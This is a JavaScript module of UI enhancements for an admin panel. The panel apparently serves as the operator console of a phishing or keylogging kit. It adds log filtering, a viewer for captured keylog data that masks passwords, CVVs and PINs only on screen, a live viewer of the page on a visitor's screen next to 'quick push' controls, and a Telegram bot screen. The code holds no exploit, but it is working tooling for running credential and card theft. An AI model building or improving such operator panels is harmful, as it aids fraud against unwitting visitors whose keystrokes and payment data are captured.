/* =============================================================================
   SHF ADMIN — PER-SCREEN ENHANCEMENTS
   -----------------------------------------------------------------------------
   admin/shell.js owns the frame (rail, command bar, contextual column) and
   admin/dashboard.js owns the Command Centre. This module is the third layer:
   the small, screen-specific behaviours that make each tab its own tool.

   Every section here follows the same rules:
     • it is idempotent (a second call does nothing),
     • it never replaces an existing handler, it adds to it,
     • it re-applies after the panel re-renders, via MutationObserver,
     • it fails silently if its markup is absent (the panel may not be loaded).

   Screens: Logs, Files, KLG, Live Page Viewer, Telegram.
   ============================================================================= */
(function (global) {
    'use strict';

    var SHF = global.SHF = global.SHF || {};

    function el(tag, cls, html) {
        var node = document.createElement(tag);
        if (cls) node.className = cls;
        if (html != null) node.innerHTML = html;
        return node;
    }
    function $(sel, root) { return (root || document).querySelector(sel); }
    function $$(sel, root) { return Array.prototype.slice.call((root || document).querySelectorAll(sel)); }
    function reduced() {
        try { return !!(global.matchMedia && global.matchMedia('(prefers-reduced-motion: reduce)').matches); }
        catch (e) { return false; }
    }
    function store(key, value) {
        try {
            if (value === undefined) return global.localStorage.getItem(key);
            global.localStorage.setItem(key, value);
        } catch (e) { /* private mode */ }
        return null;
    }

    /* Watches a container and re-runs `fn` (debounced onto an animation frame)
       whenever its children change. Returns the observer so screens can stop. */
    function watch(node, fn) {
        if (!node) return null;
        var queued = false;
        var obs = new MutationObserver(function () {
            if (queued) return;
            queued = true;
            (global.requestAnimationFrame || global.setTimeout)(function () {
                queued = false;
                try { fn(); } catch (e) { /* a screen enhancer must never break the screen */ }
            });
        });
        obs.observe(node, { childList: true, subtree: true });
        return obs;
    }

    /* ========================================================== 1. LOGS ==== */
    /* The log stream is the operator's flight recorder. Give it a search box
       and severity chips, and keep the count honest while it filters. */
    var Logs = {
        mounted: false,
        query: '',
        types: null,          // null = every type

        mount: function () {
            var list = document.getElementById('logs-list');
            if (!list || Logs.mounted) return;
            var container = list.closest('.logs-container');
            var header = container && container.querySelector('.logs-header');
            if (!header) return;

            var bar = el('div', 'shf-logbar');
            var input = el('input');
            input.type = 'search';
            input.placeholder = 'Filter the stream…';
            input.setAttribute('aria-label', 'Filter log entries');
            input.addEventListener('input', function () {
                Logs.query = input.value.trim().toLowerCase();
                Logs.apply();
            });

            var chips = el('div', 'shf-logbar');
            chips.style.gap = '4px';
            var count = el('span', 'shf-logcount');
            count.id = 'shfLogCount';

            var clear = el('button', 'shf-chip', 'All');
            clear.type = 'button';
            clear.dataset.type = '';
            clear.classList.add('is-on');
            chips.appendChild(clear);

            bar.appendChild(input);
            bar.appendChild(chips);
            bar.appendChild(count);
            header.appendChild(bar);

            chips.addEventListener('click', function (ev) {
                var btn = ev.target.closest('.shf-chip');
                if (!btn) return;
                $$('.shf-chip', chips).forEach(function (b) { b.classList.remove('is-on'); });
                btn.classList.add('is-on');
                Logs.types = btn.dataset.type || null;
                Logs.apply();
            });

            Logs.bar = chips;
            Logs.mounted = true;
            watch(list, Logs.rebuildChips);
            Logs.rebuildChips();
        },

        /* Chips come from the types actually present, not a hard-coded list:
           a new event type in the panel shows up without touching this file. */
        rebuildChips: function () {
            var list = document.getElementById('logs-list');
            if (!list || !Logs.bar) return;
            var present = {};
            $$('.log-entry .log-type', list).forEach(function (t) {
                var kind = (t.textContent || '').trim().toLowerCase();
                if (kind && kind !== 'server') present[kind] = (present[kind] || 0) + 1;
            });
            var kinds = Object.keys(present).sort(function (a, b) { return present[b] - present[a]; }).slice(0, 7);
            var sig = kinds.join(',');
            if (Logs._chipSig === sig) { Logs.apply(); return; }
            Logs._chipSig = sig;

            var keep = Logs.types;
            $$('.shf-chip', Logs.bar).forEach(function (b) {
                if (b.dataset.type) b.remove();
            });
            kinds.forEach(function (kind) {
                var b = el('button', 'shf-chip', kind);
                b.type = 'button';
                b.dataset.type = kind;
                b.classList.toggle('is-on', keep === kind);
                Logs.bar.appendChild(b);
            });
            if (keep && kinds.indexOf(keep) === -1) {
                Logs.types = null;
                $$('.shf-chip', Logs.bar).forEach(function (b) { b.classList.toggle('is-on', !b.dataset.type); });
            }
            Logs.apply();
        },

        apply: function () {
            var list = document.getElementById('logs-list');
            if (!list) return;
            var rows = $$('.log-entry', list);
            if (!rows.length) {
                var count0 = document.getElementById('shfLogCount');
                if (count0) count0.textContent = '';
                return;
            }
            var shown = 0;
            rows.forEach(function (row) {
                var kind = ((row.querySelector('.log-type') || {}).textContent || '').trim().toLowerCase();
                var text = (row.textContent || '').toLowerCase();
                var okType = !Logs.types || kind === Logs.types;
                var okText = !Logs.query || text.indexOf(Logs.query) !== -1;
                var visible = okType && okText;
                row.classList.toggle('is-hidden', !visible);
                if (visible) shown++;
            });
            var out = document.getElementById('shfLogCount');
            if (out) {
                out.textContent = shown === rows.length
                    ? rows.length + ' events'
                    : shown + ' of ' + rows.length + ' events';
            }
        }
    };

    /* ========================================================= 2. FILES ==== */
    /* Grid or list is an operator preference, not a per-visit choice. */
    var Files = {
        mount: function () {
            var list = document.getElementById('file-list');
            if (!list || list.dataset.shfView) return;
            var toolbar = $('.file-toolbar');
            if (!toolbar) return;
            list.dataset.shfView = '1';

            var saved = store('shf_files_view') || 'list';
            var group = el('div', 'shf-viewtoggle');
            group.style.marginLeft = 'auto';
            group.style.display = 'flex';
            group.style.gap = '4px';

            ['list', 'grid'].forEach(function (mode) {
                var b = el('button', 'shf-chip' + (saved === mode ? ' is-on' : ''), mode === 'list' ? 'List' : 'Grid');
                b.type = 'button';
                b.setAttribute('aria-label', mode === 'list' ? 'Show files as a list' : 'Show files as a grid');
                b.addEventListener('click', function () {
                    setView(mode);
                    store('shf_files_view', mode);
                });
                group.appendChild(b);
            });
            toolbar.appendChild(group);

            function setView(mode) {
                list.classList.toggle('shf-files--grid', mode === 'grid');
                $$('.shf-chip', group).forEach(function (b) {
                    b.classList.toggle('is-on', b.textContent.toLowerCase() === mode);
                });
            }
            setView(saved);
        }
    };

    /* =========================================================== 3. KLG ==== */
    /* Keylog data is the most sensitive thing in this panel. The backend already
       stores what it stores; the operator's screen must not print a password in
       clear. Mask credential-shaped values in the rendered text only — the
       stored record and the copy action still carry the truth. */
    var KLG_SECRET = /(pass(?:word|wd|phrase)?|pwd|secret|token|api[_-]?key|card[_-]?number|cvv|cvc|otp|pin)\s*[:=]\s*("(?:[^"]*)"|'(?:[^']*)'|[^\s,;&]+)/gi;

    function redactText(text) {
        if (!text || text.length > 4000) return text;
        return text.replace(KLG_SECRET, function (match, field, value) {
            if (/^••+$/.test(value)) return match;
            return field + '=••••••';
        });
    }

    var KLG = {
        mount: function () {
            var logs = document.getElementById('klgModalLogs');
            if (!logs || logs.dataset.shfRedact) return;
            logs.dataset.shfRedact = '1';

            var note = el('div', 'shf-redact-note');
            note.innerHTML = '<svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor">' +
                '<path d="M18 8h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-6 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3-9H9V6a3 3 0 0 1 6 0v2z"/></svg>' +
                '<span>Credential-shaped values are masked on screen. The stored record is unchanged.</span>';
            logs.parentNode.insertBefore(note, logs);

            var apply = function () {
                $$('.klg-log-content, .klg-log-url', logs).forEach(function (node) {
                    var raw = node.getAttribute('data-shf-raw');
                    if (raw == null) {
                        raw = node.textContent;
                        node.setAttribute('data-shf-raw', raw);
                    }
                    var masked = redactText(raw);
                    if (masked !== raw) {
                        node.textContent = masked;
                        node.classList.add('is-redacted');
                    }
                });
            };
            watch(logs, apply);
            apply();
        }
    };

    /* =========================================================== 4. LPV ==== */
    /* Live Page Viewer: a preview stage above the live workbench, a fullscreen
       action, and the workbench slots the stylesheet positions. The preview is
       the archived HTML of the page currently on the visitor's screen, exactly
       the blob iframe the archive modal already uses. */
    var LPV = {
        urlBase: null,

        mount: function () {
            var pane = document.getElementById('lpv-sub-live');
            if (!pane || pane.dataset.shfLpv) return;
            var grid = $('.lpv-grid', pane);
            if (!grid) return;
            pane.dataset.shfLpv = '1';

            /* --- workbench slots, assigned by panel title ------------------ */
            var slots = {
                'current page': 'current',
                'quick push': 'push',
                'live activity': 'activity',
                'audit log': 'audit'
            };
            $$(':scope > .lpv-panel', grid).forEach(function (panel) {
                var title = ((panel.querySelector('.lpv-panel-title') || {}).textContent || '').trim().toLowerCase();
                var slot = slots[title];
                if (slot) panel.classList.add('shf-lpv-slot--' + slot);
            });

            /* --- the preview stage ---------------------------------------- */
            var stage = el('div', 'shf-lpv-stage');
            stage.innerHTML =
                '<div class="lpv-panel" style="display:flex;flex-direction:column;gap:8px">' +
                '<div style="display:flex;align-items:center;justify-content:space-between;gap:8px">' +
                '<div class="lpv-panel-title" style="margin:0">Live preview</div>' +
                '<div style="display:flex;gap:6px">' +
                '<button class="lpv-btn" id="shfLpvRefresh" title="Reload the preview">Reload</button>' +
                '<button class="lpv-btn" id="shfLpvFull" title="Show the preview full screen">Fullscreen</button>' +
                '</div></div>' +
                '<div class="shf-lpv-frame is-empty" id="shfLpvFrameWrap"></div>' +
                '<div class="shf-lpv-stage-note" id="shfLpvStageNote">Nothing pushed yet — the preview follows the page on the visitor\'s screen.</div>' +
                '</div>';
            grid.insertBefore(stage, grid.firstChild);

            var wrap = document.getElementById('shfLpvFrameWrap');
            var note = document.getElementById('shfLpvStageNote');
            var frame = null;
            var pageId = '';

            function apiBase() {
                if (LPV.urlBase != null) return LPV.urlBase;
                var base = '';
                try {
                    if (typeof global.SERVER_API_BASE === 'string') base = global.SERVER_API_BASE;
                    else if (typeof global.serverFetch === 'function') base = '';
                } catch (e) { base = ''; }
                LPV.urlBase = String(base || '').replace(/\/+$/, '');
                return LPV.urlBase;
            }

            function load(id, force) {
                if (!id) {
                    wrap.innerHTML = '';
                    wrap.classList.add('is-empty');
                    note.textContent = 'Nothing pushed yet — the preview follows the page on the visitor\'s screen.';
                    frame = null;
                    return;
                }
                if (id === pageId && !force) return;
                pageId = id;
                var src = apiBase() + '/api/lpv/archive/' + encodeURIComponent(id) + '/html';
                if (!frame) {
                    frame = document.createElement('iframe');
                    frame.id = 'shfLpvFrame';
                    frame.title = 'Preview of the page on the visitor\'s screen';
                    frame.setAttribute('sandbox', 'allow-same-origin');
                    frame.setAttribute('loading', 'lazy');
                    wrap.innerHTML = '';
                    wrap.appendChild(frame);
                }
                wrap.classList.remove('is-empty');
                frame.src = src;
                note.textContent = 'Following the live session · page ' + id.slice(0, 8) + '…';
            }

            /* The panel writes the current page into #lpv-current; the shell
               reads it from there rather than from a private global. */
            var current = document.getElementById('lpv-current');
            if (current) {
                watch(current, function () {
                    load(current.dataset.pageId || current.getAttribute('data-page-id') || '');
                });
                load(current.dataset.pageId || current.getAttribute('data-page-id') || '');
            }

            var refresh = document.getElementById('shfLpvRefresh');
            if (refresh) refresh.addEventListener('click', function () { load(pageId, true); });

            var full = document.getElementById('shfLpvFull');
            if (full) {
                full.addEventListener('click', function () {
                    if (!wrap.requestFullscreen) return;
                    var p = wrap.requestFullscreen();
                    if (p && p.catch) p.catch(function () { /* user gesture rejected */ });
                });
                wrap.addEventListener('dblclick', function () {
                    try {
                        var p = wrap.requestFullscreen && wrap.requestFullscreen();
                        if (p && p.catch) p.catch(function () {});
                    } catch (e) { /* not allowed without a gesture */ }
                });
            }

            /* Reload the preview when the tab is re-entered, so a stale page is
               never mistaken for the live one. */
            LPV.reload = function () { if (pageId) load(pageId, true); };
        }
    };

    /* ========================================================= 5. TELEGRAM = */
    /* The bot screen is a form followed by a status readout: group the status
       blocks so they read as one unit instead of a second form. */
    var Telegram = {
        mount: function () {
            var container = $('#tgbot-content .tgbot-container');
            if (!container || container.dataset.shfTg) return;
            container.dataset.shfTg = '1';
            var status = $('.tgbot-status', container);
            if (status) status.setAttribute('role', 'status');
        }
    };

    /* ================================================================ boot */
    var Screens = {
        Logs: Logs,
        Files: Files,
        KLG: KLG,
        LPV: LPV,

        /* Called by the shell when a tab is entered. Cheap: each mount is a
           no-op after the first time. */
        mount: function (tab) {
            try {
                if (tab === 'logs') Logs.mount();
                else if (tab === 'files') Files.mount();
                else if (tab === 'klg') KLG.mount();
                else if (tab === 'lpv') LPV.mount();
                else if (tab === 'tgbot') Telegram.mount();
            } catch (e) { /* never let a screen enhancer break navigation */ }
        }
    };

    SHF.Screens = Screens;
    global.SHF = SHF;
}(typeof window !== 'undefined' ? window : this));
